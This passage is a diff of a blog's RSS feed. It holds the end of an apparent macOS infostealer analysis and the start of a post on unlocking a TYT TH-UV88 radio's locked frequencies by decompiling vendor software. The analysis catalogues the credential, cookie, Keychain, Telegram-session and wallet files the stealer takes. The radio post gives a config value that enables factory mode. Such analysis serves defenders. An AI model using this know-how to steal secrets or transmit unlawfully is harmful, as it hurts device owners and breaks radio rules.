+&lt;li&gt;&lt;strong&gt;Ledger Wallet&lt;/strong&gt; — checks &lt;code&gt;/Applications/Ledger Wallet.app&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Trezor Suite&lt;/strong&gt; — checks &lt;code&gt;/Applications/Trezor Suite.app&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Exodus&lt;/strong&gt; — checks &lt;code&gt;/Applications/Exodus.app&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;For each, it creates marker files, writes a configuration payload, and copies wallet data directories.&lt;/p&gt;
+&lt;h3 id=&#34;safari-data&#34; &gt;Safari Data
+&lt;span&gt;
+    &lt;a href=&#34;#safari-data&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;~/Library/Cookies/Cookies.binarycookies&lt;/code&gt; — Safari cookies&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;~/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies&lt;/code&gt; — Sandboxed Safari cookies&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;~/Library/Safari/Form Values&lt;/code&gt; — Safari autofill form data&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;apple-notes&#34; &gt;Apple Notes
+&lt;span&gt;
+    &lt;a href=&#34;#apple-notes&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;p&gt;Uses AppleScript&amp;rsquo;s &lt;code&gt;Notes&lt;/code&gt; application interface to:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Enumerate all accounts and notes&lt;/li&gt;
+&lt;li&gt;Extract creation date and body of every note&lt;/li&gt;
+&lt;li&gt;Save to &lt;code&gt;FileGrabber/notes.html&lt;/code&gt; with note count header&lt;/li&gt;
+&lt;li&gt;Also copies the raw NoteStore SQLite databases:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;NoteStore.sqlite&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;NoteStore.sqlite-shm&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;NoteStore.sqlite-wal&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Copies note media attachments (up to 30 MB)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;keychain&#34; &gt;Keychain
+&lt;span&gt;
+    &lt;a href=&#34;#keychain&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;Copies the user&amp;rsquo;s keychain directory identified by hardware UUID&lt;/li&gt;
+&lt;li&gt;The hardware UUID is obtained via: &lt;code&gt;system_profiler SPHardwareDataType | awk &amp;quot;/UUID/ { print $3 }&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;telegram-data&#34; &gt;Telegram Data
+&lt;span&gt;
+    &lt;a href=&#34;#telegram-data&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;Copies from &lt;code&gt;Telegram Desktop/tdata/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Specifically targets &lt;code&gt;key_datas&lt;/code&gt; login file&lt;/li&gt;
+&lt;li&gt;Searches for paired files (e.g., a file and its &lt;code&gt;s&lt;/code&gt; suffix counterpart)&lt;/li&gt;
+&lt;li&gt;Output stored in &lt;code&gt;Telegram Data/&lt;/code&gt; directory&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;openvpn-data&#34; &gt;OpenVPN Data
+&lt;span&gt;
+    &lt;a href=&#34;#openvpn-data&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;Copies from &lt;code&gt;OpenVPN Connect/profiles/&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;personal-documents-filegrabber&#34; &gt;Personal Documents (FileGrabber)
+&lt;span&gt;
+    &lt;a href=&#34;#personal-documents-filegrabber&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;p&gt;Scans &lt;strong&gt;Desktop&lt;/strong&gt; and &lt;strong&gt;Documents&lt;/strong&gt; folders for files with these extensions (up to 30 MB total):&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;Extension&lt;/th&gt;
+          &lt;th&gt;Type&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;.txt&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Text files&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;.pdf&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;PDF documents&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;.docx&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Word documents&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;.doc&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Legacy Word documents&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;.rtf&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Rich text files&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;.key&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Key files&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;.keys&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Key files&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;.wallet&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Wallet files&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;.kdbx&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;KeePass databases&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;.jpeg&lt;/code&gt; / &lt;code&gt;.jpg&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Photos&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;.png&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Images&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;.seed&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Seed phrase files&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;other-data-collected&#34; &gt;Other Data Collected
+&lt;span&gt;
+    &lt;a href=&#34;#other-data-collected&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Installed applications list&lt;/strong&gt; — enumerates &lt;code&gt;/Applications&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;System profile&lt;/strong&gt; — hardware, software, display information&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Mounted volumes&lt;/strong&gt; — lists connected drives&lt;/li&gt;
+&lt;/ul&gt;
+</description>
     </item>
+    
     <item>
       <title>TYT TH-UV88 Hacks: Unlock Transmit Frequencies and Factory Tools</title>
-      <link>https://jcrumb.github.io/tyt-th-uv88-hacks-unlock-transmit-frequencies-and-factory-tools/</link>
+      <link>https://jcrumb.github.io/blog/tyt-tools/</link>
       <pubDate>Sun, 30 May 2021 15:14:52 -0600</pubDate>
-      <guid>https://jcrumb.github.io/tyt-th-uv88-hacks-unlock-transmit-frequencies-and-factory-tools/</guid>
-      <description>The TYT TH-UV88 is the cheapest commercial radio you can buy in Canada &amp;ndash; but only if you have the right tools.  Let&amp;rsquo;s walk through some bad code and figure out how this $50 radio is configured.</description>
+      
+      <guid>https://jcrumb.github.io/blog/tyt-tools/</guid>
+      <description>&lt;p&gt;&lt;em&gt;&lt;strong&gt;Disclaimer: The procedures described below allow you to modify the transmission range of your TYT TH-UV88, including unlocking frequencies that may be illegal for you to
+transmit on depending on your jurisdiction. Proceed at your own risk, and ensure that you&amp;rsquo;re compliant with local laws around transmission frequencies.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;If you would like to skip the technical background and jump straight to instructions click &lt;a href=&#34;#putting-it-all-together&#34;&gt;here&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;I recently picked up a &lt;a href=&#34;https://www.fleetwooddp.com/collections/handheld-amateur-ham-radios-and-walkie-talkies-for-business-and-family-use/products/tyt-th-uv88-dual-band-pure-amateur-ham-radio&#34;&gt;TYT TH-UV88&lt;/a&gt; hoping to have a cheap option for backroads use in Canada.
+As far as I know, this is the cheapest radio that has an ISED certification number for land mobile use, which is a special class of radios that operate outside of
+the designated amateur bands. These radios are commonly used for commercial traffic, and are especially handy on forestry roads so as not to get creamed by a
+logging truck.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://jcrumb.github.io/blogimages/tyt/tyt.png&#34; alt=&#34;TYT Radio&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When I picked out this radio I figured it would be a simple job to program the &lt;a href=&#34;https://www.ic.gc.ca/eic/site/smt-gst.nsf/eng/sf11127.html&#34;&gt;standard Resource Road channels&lt;/a&gt;,
+grab a license online from ISED and be on my way. I couldn&amp;rsquo;t understand why vendors were charging more than the value of the radio itself to program the channels.&lt;/p&gt;
+&lt;h1 id=&#34;the-problem&#34; &gt;The Problem
+&lt;span&gt;
+    &lt;a href=&#34;#the-problem&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h1&gt;&lt;p&gt;Turns out that when you buy a TH-UV88 in Canada, out of the box it&amp;rsquo;s locked to amateur frequencies. You can program the channels relatively easily, but when
+you try to transmit on them you&amp;rsquo;ll simply be kicked back to the last amateur frequency used. I contacted the vendor where I got my radio, and they informed me that
+unlocking the transmit ranges required software only supplied to dealers and I&amp;rsquo;d have to ship it back to them for programming.&lt;/p&gt;
+&lt;p&gt;I had a sneaking suspicion that the &amp;ldquo;dealer only&amp;rdquo; software required was probably the same as the consumer software with a few tweaks or extra menus. Given the quality of software
+often seen with these cheap handhelds the idea that they were actually shipping two separate software packages seemed far-fetched, so I started digging.&lt;/p&gt;
+&lt;h1 id=&#34;a-bit-of-code-spelunking&#34; &gt;A Bit of Code Spelunking
+&lt;span&gt;
+    &lt;a href=&#34;#a-bit-of-code-spelunking&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h1&gt;&lt;p&gt;The first step was looking into the &lt;code&gt;setting.ini&lt;/code&gt; file that comes bundled with the software. As soon as I opened this up, my suspicions about the software being the same became a lot
+stronger, as there were a couple settings that looked interesting:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;&lt;span&gt;[setup]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;&lt;span&gt;language=english
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;&lt;span&gt;testmode=0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4&lt;/span&gt;&lt;span&gt;Factory=0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5&lt;/span&gt;&lt;span&gt;password=0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6&lt;/span&gt;&lt;span&gt;RadioName=UV-88
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7&lt;/span&gt;&lt;span&gt;CompanyName=TYT INC.(C)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;&lt;span&gt;SoftVer=Ver1.0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;&lt;span&gt;CompleteTime=2016.08.05
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;&lt;span&gt;COMSelect=COM5
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11&lt;/span&gt;&lt;span&gt;Baudradio=115200
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12&lt;/span&gt;&lt;span&gt;exepassword=777777
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13&lt;/span&gt;&lt;span&gt;languagemenu=0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14&lt;/span&gt;&lt;span&gt;OwnUsed=5
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15&lt;/span&gt;&lt;span&gt;voiceencrypt=1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16&lt;/span&gt;&lt;span&gt;timesetting=0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17&lt;/span&gt;&lt;span&gt;gpssystem=0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18&lt;/span&gt;&lt;span&gt;Chinese=Traditional
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;in particular, &lt;code&gt;testmode&lt;/code&gt;, &lt;code&gt;Factory&lt;/code&gt; and &lt;code&gt;OwnUsed&lt;/code&gt; looked like they might be useful. With that out of the way, I stumbled onto another piece of good news when launching
+the software from a non-default location; it crashed with an error message that let me know it was written with the .NET Framework, which is easy to decompile
+and results in some very readable code. Jackpot!&lt;/p&gt;
+&lt;h3 id=&#34;give-up-your-secrets&#34; &gt;Give Up Your Secrets!
+&lt;span&gt;
+    &lt;a href=&#34;#give-up-your-secrets&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;p&gt;I fired up &lt;a href=&#34;https://www.jetbrains.com/decompiler/&#34;&gt;DotPeek&lt;/a&gt; and got to work. There was a very helpfully named &lt;code&gt;FatherWin.cs&lt;/code&gt; class that looked
+like it contained the logic for the main application window, and was responsible for loading the configuration file we saw earlier. A lot of it is fairly inscrutable
+&lt;code&gt;this.toolStripMenuItem3.Name = &amp;quot;toolStripMenuItem3&amp;quot;;&lt;/code&gt; nonsense, but after a bit of reading I found this gem:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cs&#34; data-lang=&#34;cs&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;if&lt;/span&gt; (strArray[&lt;span style=&#34;color:#40a070&#34;&gt;13&lt;/span&gt;].Substring(num13 + &lt;span style=&#34;color:#40a070&#34;&gt;1&lt;/span&gt;, strArray[&lt;span style=&#34;color:#40a070&#34;&gt;13&lt;/span&gt;].Length - num13 - &lt;span style=&#34;color:#40a070&#34;&gt;1&lt;/span&gt;) == &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;ARRVIN&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3&lt;/span&gt;&lt;span&gt;    Class1.LanguageDisEable = &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Enable&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4&lt;/span&gt;&lt;span&gt;    Class1.FactoryEn = &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;true&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5&lt;/span&gt;&lt;span&gt;    Class1.GbTestModEn = &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;true&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;6&lt;/span&gt;&lt;span&gt;    Class1.GbOwnUsedEn = &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;true&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;7&lt;/span&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I set &lt;code&gt;OwnUsed=ARRVIN&lt;/code&gt; in the configuration file, figuring I was in business &amp;ndash; but it was not to be. When you have the factory mode enabled, the app starts up with a
+registration screen:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://jcrumb.github.io/blogimages/tyt/reg-screen.png&#34; alt=&#34;TYT Registration Screen&#34;&gt;&lt;/p&gt;
